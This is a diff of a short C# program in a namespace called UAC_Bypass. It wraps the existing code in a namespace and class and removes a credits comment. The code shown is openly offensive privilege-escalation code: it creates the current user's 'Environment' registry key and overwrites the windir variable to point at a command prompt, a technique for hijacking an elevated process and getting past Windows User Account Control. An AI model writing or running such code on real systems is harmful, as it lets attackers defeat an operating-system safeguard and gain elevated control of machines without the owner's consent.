@@ -1,7 +1,14 @@
+using System;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Threading;
+
+namespace UAC_Bypass
+{
+    class Program
+    {
         static void Main(string[] args)
         {
-            //credits to bluntboomer#2303
-            
             // allows us access to the user environment variable table, and changes the windir key (typically C:\Windows) to command prompt, with an added - to cancel any directories (ex: %windir%\System32)
             Microsoft.Win32.RegistryKey key;
             key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
@@ -22,3 +29,5 @@
             key.Close();
             Environment.Exit(0);
         }
+    }
+}
